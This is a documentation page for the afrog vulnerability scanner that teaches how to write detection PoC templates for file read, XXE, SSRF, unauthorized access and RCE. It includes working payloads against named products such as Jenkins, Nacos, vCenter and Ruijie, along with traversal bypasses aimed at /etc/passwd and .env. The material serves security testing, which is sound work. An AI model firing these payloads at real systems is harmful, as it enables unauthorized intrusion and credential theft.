<!--
title: Writing Guide by Vulnerability Type
slug: /docs/poc/category-guide
lang: en
summary: afrog PoC writing guidance organised by vulnerability type, with copy-ready examples. Covers File Read, XXE, SSRF, Unauthorized Access, RCE, SQL Injection, File Upload, Weak Password Brute Force, and XSS, plus a PoC quality checklist.
status: published
source: docs/zh/poc/09-category-guide.md
last_reviewed: 2026-09-23
-->

## General conventions (applies to every type)

### How `path` is assembled

This decides whether your URL is actually sent as intended:

- `path` supports `{{variable}}` rendering
- the normal form is "the target's existing path (with the trailing `/` removed)" + "`path`"
- a `path` starting with `^` means an **absolute path**: the target's own sub-path is ignored and the path is mounted at the host root, for example `path: ^/index.php`
- spaces are escaped to `%20` and `#` to `%23`
- `afrog` does not normalise `..`, so `../` enters the URL as-is and whether it resolves depends on the server

### How to write the match condition

1. never rely on `response.status == 200` alone
2. use structured anchors instead of generic words such as `root`, `admin`, or `success`
3. cross-check with multiple anchors: a complete file usually has both a head and a tail signature
4. back it up with a negative condition: `!response.body.bcontains(b"<html")`, `!response_text.icontains("not found")`
5. when you need regex over Chinese text or already-decoded content, prefer the `response_text` family (`rmatches`, `contains`)

### Rule-level controls and automatic early stopping

Besides `request` and `expression`, a `rules.<ruleName>` entry accepts three control fields:

| Field | Effect | Fits when |
| --- | --- | --- |
| `stop_if_match: true` | stop executing later rules as soon as this one matches | probing several paths or signatures where any single hit is enough |
| `stop_if_mismatch: true` | stop immediately when this one does not match | multi-step exploit chains — no token from step one means the rest is pointless |
| `before_sleep: 6` | wait N seconds before this rule runs | asynchronously applied effects (exports, generated files, cache refresh) or deliberate rate limiting |

On top of that, **the way the top-level `expression` is joined decides whether early stopping happens automatically**:

- only `&&` (no `||`) → equivalent to "stop as soon as any rule fails to match"
- only `||` (no `&&`) → equivalent to "stop as soon as any rule matches"
- mixing both → no automatic early stop, every rule runs

So it pays to use a single operator at the top level: it expresses intent clearly and saves requests on the way. Conversely, if you do mix them, expect every rule to execute.

### Common pitfalls

- **Response body limit**: `-mrbs` defaults to 2 MB, anything beyond is truncated, so anchors should sit near the start of the content
- **`requires` gating**: once `requires` is set, only targets matching the fingerprint are executed; `-nf` and `-test` bypass gating, so do not treat them as normal scan modes
- **Redirects**: add `follow_redirects` explicitly when you need to follow a 3xx, otherwise you may only get an empty 302
- **Encoding differences**: Chinese responses are not necessarily UTF-8; when a regex misses, first try the byte layer with `bsubmatch`
- **POST default headers**: if a `POST` request does not set `Content-Type`, `afrog` adds `application/x-www-form-urlencoded` automatically; `Accept` and `User-Agent` also get default values when missing. So to send JSON you must set `Content-Type: application/json` explicitly
- **Where `{{...}}` is rendered**: only inside request fields (`path`, `host`, `body`, `raw`, `data`, and header values). **It is not rendered inside `expression`**, so "store the match condition in a variable and reference it from `expression`" will not work

## File Read

### Naming and discovery

The community convention is to end the file name and `id` with `-fileread` and to include `fileread` in `tags`. What actually decides whether a PoC is found is `tags`: `-s` matches against `id`, `name`, and `tags`. The built-in corpus also contains cases that do not end with `-fileread` (such as `o2oa-open-read-file`, `ioffice-oa-iofileexport-read-file`, `CNVD-2018-16876`), and they are still found via `tags`.

```bash
afrog -t https://example.com -s fileread
```

### What to read: common targets and usable anchors

Decide which file to read first, then decide which of its characteristics to match on. Prefer files that prove impact directly:

| Target | Notes | Usable anchors |
| --- | --- | --- |
| `/etc/passwd` | Linux user database, lowest bar to verify | `root:.*?:[0-9]*:[0-9]*:` |
| `C:/Windows/win.ini` | fixed Windows configuration file | `for 16-bit app support` |
| `WEB-INF/web.xml` | Java application deployment descriptor | `<web-app`, `</web-app>` |
| `WEB-INF/classes/application.yml` | Spring configuration | `spring:`, `datasource` |
| `.env` | environment variables, often holding secrets | `APP_KEY=`, `DB_PASSWORD=` |
| `.git/config` | source repository configuration | `[core]`, `repositoryformatversion` |
| `C:/Windows/System32/drivers/etc/hosts` | Windows hosts file | `localhost`, `127.0.0.1` |
| `/root/.bash_history` | operator command history | `cd `, `sudo ` |

Linux user database:

```yaml
id: demo-linux-fileread

info:
  name: Demo Linux arbitrary file read
  author: your-name
  severity: high
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /download?filename=../../../../etc/passwd
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
```

Windows configuration file. The first line `for 16-bit app support` is the most widely used anchor in the corpus:

```yaml
id: demo-windows-fileread

info:
  name: Demo Windows arbitrary file read
  author: your-name
  severity: high
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /download?filename=c:/windows/win.ini
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"for 16-bit app support") 
expression: r0()
```

Java application configuration, where matching the XML tag in pairs confirms the whole file was read:

```yaml
id: demo-webxml-fileread

info:
  name: Demo Java application config read
  author: your-name
  severity: medium
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /static/../WEB-INF/web.xml
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"<web-app") &&
      response.body.bcontains(b"</web-app>")
expression: r0()
```

Sensitive files:

```yaml
id: demo-env-fileread

info:
  name: Demo .env read
  author: your-name
  severity: critical
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /static/../.env
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"APP_KEY=") &&
      !response.body.bcontains(b"<html")
expression: r0()
```

### Where the entry point lives

A file read usually has one of only four entry shapes. Work out which one your case is before writing:

#### 1. URL path traversal

Put the traversal sequence straight into the URL path. Implementations differ a lot in how they handle encoding, so try several in order:

- add depth when the traversal is not deep enough: `../../../../`
- single encoding: `..%2f`, `%2e%2e%2f`
- double encoding: `..%252f`, `%252e%252e%252f`
- when `../` is filtered, switch to `....//`, `..//`, `.../.../`
- absolute path: pass `/etc/passwd` directly, or use `path: ^/...` to ignore the target's sub-path
- separator and drive-letter variants: `\`, `%5c`, `c:/`

```yaml
id: demo-traversal-fileread

info:
  name: Demo traversal and encoding bypass
  author: your-name
  severity: high
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /download?filename=../../../../etc/passwd
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r1:
    request:
      method: GET
      path: /download?filename=..%2f..%2f..%2f..%2fetc%2fpasswd
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r2:
    request:
      method: GET
      path: /download?filename=....//....//....//....//etc/passwd
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0() || r1() || r2()
```

Splitting variants of the same target into separate rules combined with `r0() || r1() || ...` makes it much easier to tell which form worked than cramming every variant into one rule.

#### 2. Query parameter

"Download / export" style endpoints often take the file path as a query parameter, for example `?url=/etc/passwd` or `?filename=test.txt`:

```yaml
    request:
      method: GET
      path: /iOffice/prg/set/iocom/ioFileExport.aspx?url=/etc/passwd&filename=test.txt
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
```

#### 3. Body parameter

Paths passed as form or JSON values, for example `templateUrl=/etc/passwd` or `{"fileName":"../../../etc/passwd"}`:

```yaml
id: demo-param-fileread

info:
  name: Demo parameter-based file read
  author: your-name
  severity: high
  tags: demo,fileread

rules:
  r0:
    request:
      method: POST
      path: /api/export/read
      headers:
        Content-Type: application/json; charset=UTF-8
      body: |
        {"fileName":"../../../etc/passwd"}
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
```

If the endpoint requires a login first, you can obtain the token in an earlier rule and pass it on with `output`; see the `output` section of [PoC Syntax](./02-syntax.md).

#### 4. raw

When `path` assembly, escaping, or default request headers get in the way, write the request by hand with `raw`. The official corpus even contains a `.//` trick to dodge path normalisation:

```yaml
id: demo-raw-fileread

info:
  name: Demo raw read of web.xml
  author: your-name
  severity: medium
  tags: demo,fileread

set:
  hostname: request.url.host

rules:
  r0:
    request:
      raw: |
        GET .//WEB-INF/web.xml HTTP/1.1
        Host: {{hostname}}
        User-Agent: Mozilla/5.0
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"<web-app") &&
      (response.raw_header.bcontains(b"application/xml") || response.raw_header.bcontains(b"text/xml"))
expression: r0()
```

### False-positive control for this type

The biggest source of false positives in file reads is "a 200 error page was echoed back". A few rules of thumb:

1. anchor on the file's **own structure**, not on file names or generic words: `root:.*?:[0-9]*:[0-9]*:`, `[core]`, `APP_KEY=`
2. a complete file usually has a head and a tail signature, so match them in pairs where possible: `<web-app` + `</web-app>`
3. when you are unsure whether the response is a page, add a negative condition: `!response.body.bcontains(b"<html")`
4. keep anchors near the start of the file so `-mrbs` truncation does not cut them off (see Common pitfalls)

## XXE (XML External Entity)

### Naming and discovery

The convention is to end the file name and `id` with `-xxe` and to include `xxe` in `tags` (usually alongside vendor names, for example `seeyon,oa,xxe`).

```bash
afrog -t https://example.com -s xxe
```

### First split: can the file be read out

| Shape | Evidence | Requests |
| --- | --- | --- |
| With echo (file read) | the response carries the file content | 1 |
| Blind XXE (OOB) | the target calls back to the OOB platform | 1 |
| Error-based | the content is leaked inside an error message | 1 |

The corpus is dominated by **blind XXE over OOB**: most XML endpoints never echo the parse result, and a callback already proves the entity was resolved.

### Blind XXE: call back with a parameter entity

Built-in PoC `jinhe-oa-xmlhttp-xxe`:

```yaml
id: jinhe-oa-xmlhttp-xxe

info:
  name: 金和OA-XmlHttp.aspx-XXE漏洞
  author: avic123
  severity: high
  verified: true
  tags: jinhe,oa,xxe
  created: 2025/09/11

rules:
  r0:
    request:
      method: POST
      path: /c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/
      body: |
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "{{oob.HTTP}}/xxe_test">
        %remote;]>
        <root/>
    expression: response.status == 200 && oobCheck(oob.ProtocolHTTP, 3)
expression: r0()
```

Key points:

- **you must use a parameter entity (`%`) and actually reference it** (`%remote;`). A normal entity (`&xxe;`) only expands when the template references it, which we cannot control in a blind case
- **the match is `status == 200` combined with `oobCheck`**. Judging on `oobCheck` alone would also treat "the endpoint itself errored and never accepted the request" as a hit
- there is no need to initialise `oob` in `set`; `{{oob.HTTP}}` can be used directly
- 3 seconds is a reasonable timeout for HTTP (use 5 for DNS); raise it gradually when the callback may be asynchronous

> The `oobCheck(oob.ProtocolHTTP, 3)` seen across the corpus is equivalent to `oobCheck("http", 3)` — the value of `oob.ProtocolHTTP` is simply the string `"http"`. Both forms work; this documentation uses the latter consistently.

**The injection point is not necessarily the request body.** Built-in PoC `yonyou-u8-ufgovbank-xxe` hides the XML inside a form parameter and uses the shorter DOCTYPE external-DTD form:

```yaml
      body: |
        reqData=<?xml version="1.0"?>
        <!DOCTYPE foo SYSTEM "{{oob.HTTP}}">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
    expression: oobCheck(oob.ProtocolHTTP, 3)
```

When facing a form-style endpoint, work out first whether the XML is treated as a parameter value or as the whole request body — that decides whether your payload needs outer wrapping.

### With echo: read the file directly

Built-in PoC `seeyon-getajaxdataservlet-xxe`. The XML it needs to send looks like this:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>
<Signature><Field><a Index="ProtectItem">true</a><b Index="Caption">caption</b><c Index="ID">id</c><d Index="VALUE">&xxe;</d></Field></Signature>
```

The full PoC:

```yaml
id: seeyon-getajaxdataservlet-xxe

info:
  name: 致远OA getAjaxDataServlet XXE
  author: Wen
  severity: critical
  verified: true
  tags: seeyon,oa,xxe
  created: 2024/01/12
  requires: [seeyon]
  requires-mode: opportunistic

rules:
  r0:
    request:
      method: POST
      path: /seeyon/m-signature/RunSignature/run/getAjaxDataServlet
      body: |
        S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=<URL-encoded form of the XML above>
    expression: |
      (response.status == 200 || response.status == 206) &&
      response.body.ibcontains(b"[fonts]") &&
      response.body.ibcontains(b"[extensions]")
expression: r0()
```

Key points:

- **both conditions are required**: declare the entity with `<!ENTITY xxe SYSTEM "file:///...">`, then **reference it once** in the XML as `&xxe;`. Declaring without referencing means it never expands
- **the XML must be URL-encoded before being sent as a parameter**: in the original file `xmlValue=` is followed by a long run of `%3C%3Fxml...`, which has been decoded back to raw XML above for readability. Remember to encode when writing this by hand
- **anchor on the file's own structure**: here the two win.ini section names `[fonts]` and `[extensions]` are used (the full first line is `for 16-bit app support`, see File Read). Do not judge on vague signals like "the response mentions windows"
- **the status code may be `200` or `206`**, hence `(response.status == 200 || response.status == 206)`
- it is gated with `requires: [seeyon]` and `requires-mode: opportunistic`, see [requires](./04-requires.md)

### Two extensions of the file read

- **give one file each for Linux and Windows**: `/etc/passwd` and `c:/windows/win.ini` as separate rules joined with `||`. The target table and anchors can be reused directly from File Read
- **widen the impact by changing file type**: configuration files (`web.xml`, `application.yml`) and credential files (`.env`, `.git/config`) are the old standbys; on cloud targets you can also try `/proc/self/environ`

### False-positive control for this type

1. a blind XXE match must include `oobCheck`, otherwise any endpoint returning 200 will hit
2. with echo, anchor on the file's own structure (`[fonts]`, the `root:` regex), not on broad words
3. the entity must actually be referenced (`&xxe;` or `%remote;`), otherwise it never expands
4. when the XML is sent as a form parameter, URL-encode it first
5. for expensive PoCs or vendor-specific targets, add `requires` gating

## SSRF (Server-Side Request Forgery)

### Naming and discovery

The convention is to end the file name and `id` with `-ssrf` and to include `ssrf` in `tags`.

Note that **casing is inconsistent in the corpus** (both `tags: weblogic,ssrf` and `tags: angjie,SSRF` appear), so supply both when filtering:

```bash
afrog -t https://example.com -s ssrf,SSRF
```

### First split: how to prove the server really sent the request

| Shape | Evidence | Requests |
| --- | --- | --- |
| Callback to the OOB platform | the target connects back to an address we control | 1 |
| Local file read (`file://`) | the response carries the file content | 1 |
| Internal address/port echoed back | the response leaks the requested `host:port`, or shows a connection-state difference | 1 |

### Pattern 1: call back to OOB (most general)

Built-in PoC `angjie-crm-rptviewer-ssrf`:

```yaml
id: angjie-crm-rptviewer-ssrf

info:
  name: 昂捷CRM-RptViewer.aspx存在SSRF漏洞
  author: AVIC123
  severity: high
  verified: true
  tags: angjie,SSRF
  created: 2025/09/05

rules:
  r0:
    request:
      method: GET
      path: /WebForms/RptViewer.aspx?ReportServer={{oob.HTTP}}
    expression: response.status == 200 && oobCheck(oob.ProtocolHTTP, 3)
expression: r0()
```

Key points:

- pass `{{oob.HTTP}}` as the parameter value and let `oobCheck` do the judging. This is the most general trick — you do not need to know what the target received, only that it really issued the request
- combining `status == 200` with `oobCheck` is recommended here too, so an endpoint erroring on its own is not counted as a hit
- this requires a configured OOB platform, see [OOB](./06-oob.md)

### Pattern 2: `file://` local file read

Built-in PoC `vmware-vcenter-provider-logo-ssrf`:

```yaml
id: vmware-vcenter-provider-logo-ssrf

info:
  name: Vmware VCenter - Arbitrary File Read
  author: xpoc
  severity: critical
  verified: true
  tags: vmware,vmware-vcenter,lfi,ssrf
  created: 2024/01/05

rules:
  r0:
    request:
      method: GET
      path: /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r1:
    request:
      method: GET
      path: /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///c://windows/win.ini
    expression: response.status == 200 && response.body.bcontains(b"bit app support")
expression: r0() || r1()
```

Key points:

- **the common downgrade path for SSRF is file read**: the parameter only checks "is this a URL" without restricting the scheme, so `file://` reads local files directly
- the match reuses the anchors from File Read (the passwd field-structure regex, the win.ini section name), one rule each for Linux and Windows, joined with `||`. The example uses `bit app support`; when writing your own, prefer the full first line `for 16-bit app support`, which is less likely to false-positive
- note that the Windows path is written as `file:///c://windows/win.ini` (a double slash after the drive letter). Implementations tolerate paths differently, so try several forms when needed
- this PoC carries both `lfi` and `ssrf` in `tags` — it is both SSRF and arbitrary file read, so it is found from either side

### Pattern 3: a failed connection also proves it

Built-in PoC `weblogic-ssrf` requests a **closed port**:

```yaml
      path: /uddiexplorer/SearchPublicRegistries.jsp?...&operator=http://127.1.1.1:700
    expression: 'response.status == 200 && (response.body.bcontains(b"&#39;127.1.1.1&#39;, port: &#39;700&#39;") || response.body.bcontains(b"Socket Closed"))'
```

Key points:

- the match uses `Socket Closed`, or the `'127.1.1.1', port: '700'` echoed inside the error message. **This shows an SSRF match does not require "getting content back"** — the response carrying the `host:port` we supplied, or showing a connection-refused difference, is enough to prove the request was really sent
- port 700 is deliberately a closed port: a failure such as `Socket Closed` is itself a usable signal. If instead the target treats it as a plain string and the response never changes, you have to fall back to the OOB route
- put another way, **you can compare the response difference between an open and a closed port** — if the two behave differently, the server really did connect

### False-positive control for this type

1. anchor on evidence that the request really went out: an OOB callback, an echoed internal address/port, or a connection-state difference. Do not judge on `response.status == 200` alone
2. use the OOB platform for callback addresses rather than hard-coding an external domain
3. when it downgrades to a file read (`file://`), reuse the anchors from File Read
4. remember the two `ssrf` / `SSRF` tag casings and supply both when searching

## Unauthorized Access

### Naming and discovery

The convention is to end the file name and `id` with `-unauth` (variants such as `-unauthorized`, `-unauthorized-access`, and `-unauthenticated` also appear). Include `unauth` or `unauthorized` in `tags`.

This type has its own directory in the corpus, `afrog-pocs/unauthorized/`, with the rest scattered under `afrog-pocs/vulnerability/`.

```bash
afrog -t https://example.com -s unauth
```

### First split: HTTP endpoint or network service

How you write it depends on what the target is, so decide this before starting:

| Shape | Target | Request style | What you match on |
| --- | --- | --- | --- |
| Unauthenticated HTTP endpoint | admin panels, monitoring pages, config / user APIs | a normal HTTP request, often with candidate path enumeration | `response.body`, `response.headers` |
| Unauthenticated network service | Redis, Memcached, Zookeeper, and friends | `type: tcp`, connect directly and speak the protocol | `response.raw` |

### HTTP endpoint: enumerating candidate paths

The path of these endpoints is often not fixed (different deployments mount it under different base paths), so the most common approach is to enumerate a set of candidates with `brute`. Built-in PoC `springboot-actuator-unauth`:

```yaml
id: springboot-actuator-unauth

info:
  name: Springboot Actuator Unauth
  author: ffffffff0x
  severity: high
  verified: true
  reference:
    - https://github.com/LandGrey/SpringBootVulExploit
  tags: actuator,springboot,unauth
  created: 2023/07/07

rules:
  r0:
    brute:
      mode: sniper
      commit: winner
      continue: false
      p:
        - /env
        - /appenv
        - /env%72
        - /appenv%72
        - ;;/env;.css
    request:
      method: GET
      path: "{{p}}"
    expression: |
      response.status == 200 &&
      response.content_type.contains("json") &&
      response.body.bcontains(b"java.version") &&
      response.body.bcontains(b"os.arch")
  r1:
    brute:
      mode: sniper
      commit: winner
      continue: false
      p:
        - /actuator
        - /api/actuator
        - /prod-api/actuator
        - /actuato%72
    request:
      method: GET
      path: "{{p}}"
    expression: |
      response.status == 200 &&
      response.body.bcontains(b'"_links":') &&
      response.body.bcontains(b'"env":') &&
      response.body.bcontains(b'"heapdump":')
expression: r0() || r1()
```

Three things worth copying:

- `path: "{{p}}"` combined with a `brute` candidate list lets one rule cover every path variant
- the candidate list mixes two kinds of bypass: encoding (`/actuato%72`) and semicolon path parameters (`;;/env;.css`)
- different base paths of the same endpoint are included together (`/actuator`, `/api/actuator`, `/prod-api/actuator`)

On the three `brute` fields: the current implementation special-cases only `pitchfork`; every other value (including the `sniper` common in the corpus) falls through to the default `clusterbomb`. With a single iterated variable all of them behave identically. See [brute](./05-brute.md) for the combination semantics.

### HTTP endpoint: how to write the match

The biggest false positive here is "mistaking a public page for an unauthenticated API", so the match has to pin down two things at once: **that it is an API**, and **that it returned data it should not expose**. Built-in PoC `nacos-user-list-unauthorized`:

```yaml
id: nacos-user-list-unauthorized

info:
  name: Alibaba Nacos V1 Auth Bypass
  author: kmahyyg
  severity: high
  verified: true
  tags: alibaba,nacos,unauth
  created: 2023/07/07

rules:
  r0:
    request:
      method: GET
      path: /nacos/v1/auth/users?pageNo=1&pageSize=9
      headers:
        User-Agent: Nacos-Server
    expression: |
      response.status == 200 &&
      response.headers["content-type"].contains("application/json") &&
      response.body.bcontains(b'"username":') &&
      response.body.bcontains(b'"password":')
  r1:
    request:
      method: GET
      path: /v1/auth/users?pageNo=1&pageSize=9
      headers:
        User-Agent: Nacos-Server
    expression: |
      response.status == 200 &&
      response.headers["content-type"].contains("application/json") &&
      response.body.bcontains(b'"username":') &&
      response.body.bcontains(b'"password":')
expression: r0() || r1()
```

Key points:

- constrain the response type first with `response.content_type.contains("json")` or `response.headers["content-type"].contains(...)`
- pick anchors that **only this endpoint** would produce: `"username":` + `"password":`, `"kubeletVersion"`, `"links":` + `"attributes"`

### HTTP endpoint: extra conditions for auth bypass

Some cases called "unauthenticated" are really auth bypasses triggered by a specific condition, and the request has to carry it or nothing works:

- a specific User-Agent: the Nacos bypass above relies on `User-Agent: Nacos-Server`
- a specific query parameter: for example `?public=true` in Joomla CVE-2023-23752
- a specific path form: semicolon path parameters `;.css`, or an encoded path

When writing these PoCs, treat the trigger condition as part of the vulnerability and put it in the request rather than splitting it into two rules.

### Network service: direct TCP

Databases, caches, and middleware have no HTTP interface, so you speak the protocol directly. Built-in PoC `redis-unauthorized`:

```yaml
id: redis-unauthorized

info:
  name: Redis Unauthorized
  author: zan8in
  severity: high
  verified: true
  reference:
    - https://developer.aliyun.com/article/515894
  tags: network,redis,unauthorized
  created: 2024/01/16

set:
  hostname: request.url.host
  host: request.url.domain

rules:
  r0:
    request:
      type: tcp
      host: "{{hostname}}"
      data: "*1\r\n$4\r\ninfo\r\n"
    expression: |
      response.raw.bcontains(b"redis_version") ||
      response.raw.bcontains(b"72656469735f76657273696f6")
  r1:
    request:
      type: tcp
      host: "{{host}}:6379"
      data: "*1\r\n$4\r\ninfo\r\n"
    expression: |
      response.raw.bcontains(b"redis_version") ||
      response.raw.bcontains(b"72656469735f76657273696f6")
expression: r0() || r1()
```

Key points:

- take `request.url.host` / `request.url.domain` in `set` first, then build the `host` from them
- two rules cover "the target's original port" and "the service's default port" (`{{host}}:6379`) respectively
- match on `response.raw`, and match both the plain and encoded forms (the hex blob above is `redis_version` in hex, for responses that come back encoded)

The approach is unchanged for other protocols — only `data` and the port change: Memcached takes `stats`, Zookeeper takes `mntr` / `envi`, and so on.

### From unauth to further exploitation

Unauthorized access is often just the starting point, followed by credential extraction or command execution. These multi-stage PoCs pass what the previous step obtained through `output`. Built-in PoC `jenkins-unauthorized-rce`:

```yaml
id: jenkins-unauthorized-rce

info:
  name: Jenkins unauthorized rce
  author: MrP01ntSun
  severity: critical
  verified: true
  tags: jenkins,rce,unauth
  created: 2023/07/07

set:
  r1: randomInt(1000, 9999)
  r2: randomInt(1000, 9999)

rules:
  r0:
    request:
      method: GET
      path: /script
    expression: response.status == 200
    output:
      search: '"\"Jenkins-Crumb\", \"(?P<var>.+?)\"\\);".bsubmatch(response.body)'
      var: search["var"]
  r1:
    request:
      method: POST
      path: /script
      body: |
        script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
    expression: |
      response.status == 200 &&
      response.body.bcontains(bytes(string(r1) + "%" + string(r2)))
expression: r0() && r1()
```

Key points:

- `r0` only fetches the `Jenkins-Crumb` and exposes it to later rules through `output`
- the top-level `expression: r0() && r1()` means both steps must hold
- to prove "the command really ran", generate random numbers with `set: r1/r2: randomInt(...)` and have the response echo that **unpredictable value** — far more stable than matching a fixed string

### False-positive control for this type

1. "the endpoint opens" is not "unauthenticated": prove sensitive data was obtained instead (user list, configuration, keys, command output)
2. anchor with `content_type` plus a field name specific to that endpoint rather than generic words
3. for network services, confirm the answer really came from that service by matching a protocol signature (`redis_version`) rather than generic text
4. chain multi-stage PoCs with `&&` so "step one reachable, step two failed" is not counted as a hit
5. auth-bypass cases must put the trigger condition (specific header, specific parameter) in the request, otherwise they hit only intermittently

## RCE

### Naming and discovery

The convention is to end the file name and `id` with `-rce`, adding a qualifier in the middle for specific shapes, for example `-ping-rce`, `-cli-rce`, `-jndi-rce`, `-deserialization-rce`. Include `rce` in `tags` along with the component (`log4j`, `fastjson`, `thinkphp`) or the vulnerability class (`jndi`, `deserialization`).

```bash
afrog -t https://example.com -s rce
```

### First split: where does the evidence come from

This decides the skeleton of the whole PoC, and matters far more than which fields you pick:

| Shape | Evidence source | How to match |
| --- | --- | --- |
| Echo-based | command output is carried back in the response body | prove it with an **unpredictable value** |
| Write-then-read | write a file / webshell first, then read it back | chain both steps with `&&` |
| No-echo | the target calls back to the OOB platform | `oobCheck("dns", 5)` |
| Deserialization / expression injection | mostly no echo, occasionally with echo | no echo goes through OOB; with echo it is the same as "echo-based" |

### Echo-based: prove it with an unpredictable value

When the command output is visible directly, **do not match fixed strings such as `uid=0(root)`, `whoami`, or `www-data`** — they can also appear in error pages and static files. The right approach is to make the target echo a randomly generated result that can only appear if the command really ran. Built-in PoC `ruijie-eg-cli-rce`:

```yaml
id: ruijie-eg-cli-rce

info:
  name: ruijie-eg-cli-rce
  author: Jarcis
  severity: high
  verified: true
  tags: ruijie,cli,rce
  created: 2023/08/13

set:
  r1: randomInt(8000, 10000)
  r2: randomInt(8000, 10000)

rules:
  r0:
    request:
      method: POST
      path: /login.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        username=admin&password=admin?show+webmaster+user
    expression: response.status == 200 && response.content_type.contains("text/json")
    output:
      search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
      password: search["password"]
  r1:
    request:
      method: POST
      path: /login.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        username=admin&password={{password}}
    expression: |
      response.status == 200 &&
      response.content_type.contains("text/json") &&
      response.headers["set-cookie"].contains("user=admin") &&
      response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
  r2:
    request:
      method: POST
      path: /cli.php?a=shell
      body: |
        notdelay=true&command=expr {{r1}} * {{r2}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0() && r1() && r2()
```

Key points:

- `set` generates two random integers, the command makes the target compute `expr {{r1}} * {{r2}}`, and the match verifies the product `bytes(string(r1 * r2))`
- the product is unpredictable, so matching it basically proves the command really executed
- it is a three-stage chain: bypass the login to recover the password (`output` passing it along), confirm the login succeeded, then execute and prove it
- `bytes(...)` turns the string into a byte stream so it can be combined with `bcontains`

### Covering both platforms: pick the techniques you need, not all of them

Which commands work depends on the target OS: Windows has `set /A` and `type`, Linux has `expr`, `bc`, and `cat`. The five below are **interchangeable verification techniques** — one or two, chosen for the target environment, are enough.

They share the same header and random variables:

```yaml
info:
  name: Demo command injection detection
  author: your-name
  severity: critical
  tags: demo,rce

set:
  s1: randomInt(800000000, 1000000000)
  s2: randomInt(800000000, 1000000000)
```

Each fragment below is one rule; combine it with the header above to get a complete PoC.

#### Technique 1: Linux arithmetic proof (preferred)

```yaml
  r0:
    request:
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=expr {{s1}} - {{s2}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
```

#### Technique 2: Linux arithmetic proof (fallback when `expr` is absent)

```yaml
  r1:
    request:
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=echo {{s1}}-{{s2}}|bc
    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
```

#### Technique 3: Windows arithmetic proof

```yaml
  r2:
    request:
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=set /A {{s2}}-{{s1}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(s2 - s1)))
```

#### Technique 4: Linux file-read proof

```yaml
  r3:
    request:
      method: POST
      path: /test1
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=cat /etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
```

#### Technique 5: Windows file-read proof

```yaml
  r4:
    request:
      method: POST
      path: /test2
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=type c:/windows/win.ini
    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
```

#### How to combine for the fewest requests

| Scenario | Keep | Requests when the target is not vulnerable |
| --- | --- | --- |
| target platform known | 1 arithmetic proof for that platform | 1 |
| platform unknown | 1 arithmetic proof each for Windows and Linux | 2 |
| also want to prove "files can be read" | an arithmetic proof plus a same-platform file-read proof | 2 |
| all five | not recommended | 5 |

The key insight: **the number of rules equals the number of requests when the target is not vulnerable** — and that is the case for the overwhelming majority of scanned targets. `||` with stop-on-hit only saves requests **on a hit**; on a miss every rule runs. So do not equate "more thorough" with "write them all".

Built-in PoC `yonyou-nc-uploadservlet-rce` does exactly the "platform unknown" approach: only two arithmetic proofs (one `set /A`, one `expr`) joined with `||`, matching the result inside the response headers.

#### Writing notes

- **the arithmetic proof must be random**: `bytes(string(...))` first converts the result to a string and then to bytes so it can be compared against `response.body` (bytes). The subtraction direction just needs to match the verification expression
- **use a 9-10 digit range for the random numbers**: the match is a substring test, so four-digit numbers are easily hit by chance through timestamps or IDs in the response; a large range also avoids the result degenerating to `0` or a single digit
- **file-read proof anchors** reuse the conclusions from File Read directly: `for 16-bit app support` (first line of `win.ini`), `root:.*?:[0-9]*:[0-9]*:` (passwd)
- **never use fixed output** (`whoami`, `uid=0(root)`, `www-data`): they may come from an error page, a static file, or a site template
